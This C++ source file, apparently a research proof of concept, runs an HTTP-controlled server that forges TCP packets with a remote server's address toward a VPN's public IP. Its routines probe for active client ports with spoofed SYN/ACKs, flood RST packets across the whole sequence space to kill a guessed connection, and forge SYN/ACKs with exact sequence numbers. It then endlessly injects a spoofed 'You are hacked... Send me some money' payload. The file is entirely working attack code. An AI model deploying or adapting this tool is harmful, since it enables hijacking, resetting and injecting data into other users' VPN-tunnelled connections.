#include "httplib.h"
#include <iostream>
#include <tins/tins.h>
#include <string>
#include <time.h>
using namespace httplib;
using namespace std;
using namespace Tins;


uint16_t start_port = 32768, end_port = 65530;
IPv4Address remote_server_ip, vpn_wan_ip;
uint16_t spoof_server_port;
uint16_t remote_server_port;


int port_search_range = 2000;
string packet_iface;
IP ack_pkts[40000];


double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}

// Send linear ACK packets back with the ports from [begin_port, begin_port+ port_search_range), for example, [32768, 34768)
void sendLinearResponse(uint16_t begin_port) {
    PacketSender sender;
	NetworkInterface ack_iface(packet_iface); 
    
    uint16_t max_port = (begin_port + port_search_range) < end_port ? begin_port + port_search_range : end_port;
    struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);
    for (uint16_t port = begin_port; port < max_port; port++) {
        sender.send(ack_pkts[port - start_port], ack_iface);
        usleep(10);
    }   
    gettimeofday(&stop_time, NULL);
    cout << "send ACKs time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;
}


// a base funcetion to split string
std::vector<uint16_t> stringSplit(const std::string& str, char delim) {
    std::size_t previous = 0;
    std::size_t current = str.find(delim);
    std::vector<uint16_t> elems;
    while (current != std::string::npos) {
        if (current > previous) {
            string test = str.substr(previous, current - previous);
            uint16_t temp = atoi(test.c_str());
            elems.push_back(temp);
        }
        previous = current + 1;
        current = str.find(delim, previous);
    }
    if (previous != str.size()) {
        string test = str.substr(previous);
        uint16_t temp = atoi(test.c_str());
        elems.push_back(temp);
    }
    return elems;
}

// send targeted ACK packets back with the ports that are still not ACKed in the range of [begin_port, begin_port+ port_search_range), for example, in the range of [32768, 34768), maybe 32770, 32771, ..., 33111, ... are not ACKed. Only to send these ports.
void sendSpecificResponse(uint16_t base_port, std::vector<uint16_t> all_increment) {
    PacketSender sender;
	NetworkInterface ack_iface(packet_iface); 

    IP ack_pkt = IP(vpn_wan_ip, remote_server_ip) / TCP(40000, remote_server_port);
    ack_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
    uint16_t cur_port = base_port;
    for (auto &incre : all_increment) {
        cur_port += incre;
        ack_pkt.rfind_pdu<TCP>().dport(cur_port);
        sender.send(ack_pkt, ack_iface);
        usleep(10);
    }   
}

// Send RST packets to the VPN public IP address with the guessed_client_port and ttl_for_rst
// The sequence numbers are increased with a dirta of 32000
void sendRSTs(int ttl_for_rst, uint16_t guessed_client_port) {
    PacketSender sender;
	NetworkInterface rst_iface(packet_iface); 
    IP rst_pkt = IP(vpn_wan_ip, remote_server_ip) / TCP(guessed_client_port, remote_server_port);
    rst_pkt.rfind_pdu<IP>().ttl(ttl_for_rst);
    TCP& tcp = rst_pkt.rfind_pdu<TCP>();
    tcp.set_flag(TCP::RST, 1);

    int dir = 32000;
    long max_seq_num = 4294967295;
    tcp.ack_seq(1);
    struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);
    for (long cur_seq = 1 ; cur_seq < max_seq_num; cur_seq += dir) {
        tcp.seq(cur_seq);
        sender.send(rst_pkt, rst_iface);
        usleep(5);
    }   
    gettimeofday(&stop_time, NULL);
    cout << "send RSTs time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;
    cout << "send rst finished " << endl;
}

// Send spoofed SYN/ACK to the VPN public IP address with the guessed_client_port, exact_seq, and exact_ack
void sendSA(uint16_t guessed_client_port, uint32_t exact_seq, uint32_t exact_ack) {
    PacketSender sender;
	NetworkInterface sa_iface(packet_iface); 
    IP sa_pkt = IP(vpn_wan_ip, remote_server_ip) / TCP(guessed_client_port, remote_server_port);
    sa_pkt.rfind_pdu<IP>().ttl(64);
    TCP& tcp = sa_pkt.rfind_pdu<TCP>();
    tcp.set_flag(TCP::SYN, 1);
    tcp.set_flag(TCP::ACK, 1);
    tcp.seq(exact_seq);
    tcp.ack_seq(exact_ack);
    for (int i = 0; i < 10; i++) {
        sender.send(sa_pkt, sa_iface);
        usleep(10);
    }
    cout << "send SYN/ACK finished!" << endl;
}

void sendSAforTTL(uint16_t attacker_port) {
    PacketSender sender;
	NetworkInterface sa_iface(packet_iface); 
    IP sa_pkt = IP(vpn_wan_ip, remote_server_ip) / TCP(attacker_port, spoof_server_port);
    sa_pkt.rfind_pdu<IP>().ttl(64);
    TCP& tcp = sa_pkt.rfind_pdu<TCP>();
    tcp.set_flag(TCP::SYN, 1);
    tcp.set_flag(TCP::ACK, 1);
    tcp.seq(1);
    tcp.ack_seq(2);
    for (int i = 0; i < 3; i++) {
        sender.send(sa_pkt, sa_iface);
        usleep(10);
    }
    cout << "send SYN/ACK forTTL finished!" << endl;
}

// Send spoofed message to the VPN public IP address with the guessed_client_port, exact_seq, and exact_ack
void sendJunk(uint16_t guessed_client_port, uint32_t exact_seq, uint32_t exact_ack) {
    PacketSender sender;
	NetworkInterface pa_iface(packet_iface); 
    IP pa_pkt = IP(vpn_wan_ip, remote_server_ip) / TCP(guessed_client_port, remote_server_port) / RawPDU("You are hacked!!!!!!!!!Send me some money!!!!!!");
    TCP& tcp = pa_pkt.rfind_pdu<TCP>();
    tcp.set_flag(TCP::PSH, 1);
    tcp.set_flag(TCP::ACK, 1);
    tcp.seq(exact_seq);
    tcp.ack_seq(exact_ack);
    while (1) {
        sender.send(pa_pkt, pa_iface);
        sleep(1);
    }
    cout << "send junk finished " << endl;
}

int main(int argc, char** argv) {

    if (argc != 6) {
        cout << "wrong number of args ---> (remote_server_ip, remote_server_port, vpn_wan_ip, spoof_server_port, packet_iface)" << endl;
        return 0;
        //e.g., sudo ./tcp-spoof-server 172.22.0.14 22 45.67.97.14 5902 eth0
    }
    remote_server_ip = IPv4Address(argv[1]);
    remote_server_port = atoi(argv[2]);

    vpn_wan_ip = IPv4Address(argv[3]);
    spoof_server_port = atoi(argv[4]);
    packet_iface = argv[5];

    // initiate ACK packets for latter use
    for (int i = 0; i < end_port - start_port ; i++) {
        ack_pkts[i] = IP(vpn_wan_ip, remote_server_ip) / TCP(start_port + i, remote_server_port);
        ack_pkts[i].rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        ack_pkts[i].rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
        ack_pkts[i].rfind_pdu<TCP>().seq(1);
        ack_pkts[i].rfind_pdu<TCP>().ack_seq(2);
    }


    httplib::Server svr;
    svr.Get(R"(/begin_port/(\d+))", [&](const Request& req, Response& res) {
        string str = req.matches[1];
        uint16_t begin_port = atoi(str.c_str());
        std::cout << "begin_port: " << begin_port << endl;
        sendLinearResponse(begin_port);
        res.set_content("send linear ACKs done!"+ str, "text/plain");
    });

    svr.Post("/possible_ports", [&](const Request& req, Response& res) {
        string val1 = req.get_param_value("base_port");
        uint16_t base_port = atoi(val1.c_str());
        string val2 = req.get_param_value("all_increment");
        auto ports = stringSplit(val2,',');
        std::cout << "all_increment: " << ports.size() << endl;
        sendSpecificResponse(base_port, ports);
        res.set_content("send targeted ACKs done!", "text/plain");
    });
    
    svr.Post("/send_rst", [&](const Request& req, Response& res) {
        string val1 = req.get_param_value("guessed_client_port");
        uint16_t guessed_client_port = atoi(val1.c_str());
        string val2 = req.get_param_value("ttl_for_rst");
        int ttl_for_rst = atoi(val2.c_str());
        std::cout << "post: send_rst, got guessed_client_port: " << guessed_client_port << ", ttl_for_rst: " << ttl_for_rst << endl;
        sendRSTs(ttl_for_rst, guessed_client_port);
        res.set_content("send rsts done!", "text/plain");
    });

     svr.Post("/send_sa", [&](const Request& req, Response& res) {
        string val1 = req.get_param_value("guessed_client_port");
        uint16_t guessed_client_port = atoi(val1.c_str());
        string val2 = req.get_param_value("exact_seq");
        uint32_t exact_seq = atoi(val2.c_str());
        string val3 = req.get_param_value("exact_ack");
        uint32_t exact_ack = atoi(val3.c_str());

        cout << "post: send_SA, got exact_seq and exact_ack: " << exact_seq << ", " << exact_ack << endl;
        sendSA(guessed_client_port, exact_seq, exact_ack);
        res.set_content("send SYN/ACK done!", "text/plain");
    });

    svr.Post("/send_sa_for_ttl", [&](const Request& req, Response& res) {
        string val1 = req.get_param_value("attacker_port");
        uint16_t attacker_port = atoi(val1.c_str());
        cout << "post: send_sa_for_ttl, got attacker_port: " << attacker_port << endl;
        sendSAforTTL(attacker_port);
        res.set_content("send SYN/ACK for TTL done!", "text/plain");
    });

    svr.Post("/send_junk", [&](const Request& req, Response& res) {
        string val1 = req.get_param_value("guessed_client_port");
        uint16_t guessed_client_port = atoi(val1.c_str());
        string val2 = req.get_param_value("exact_seq");
        uint32_t exact_seq = atoi(val2.c_str());
        string val3 = req.get_param_value("exact_ack");
        uint32_t exact_ack = atoi(val3.c_str());

        cout << "post: send_junk, got exact_seq and exact_ack: " << exact_seq << ", " << exact_ack << endl;
        sendJunk(guessed_client_port, exact_seq, exact_ack);
        res.set_content("send junk done!", "text/plain");
    });

    svr.Get("/stop", [&](const Request& req, Response& res) {
        svr.stop();
    });
    svr.set_keep_alive_max_count(10); // Default is 5
    svr.set_keep_alive_timeout(1000);  // Default is 5
    svr.set_read_timeout(10, 0); // 5 seconds
    svr.set_write_timeout(10, 0); // 5 seconds
    svr.listen("0.0.0.0", spoof_server_port);
}
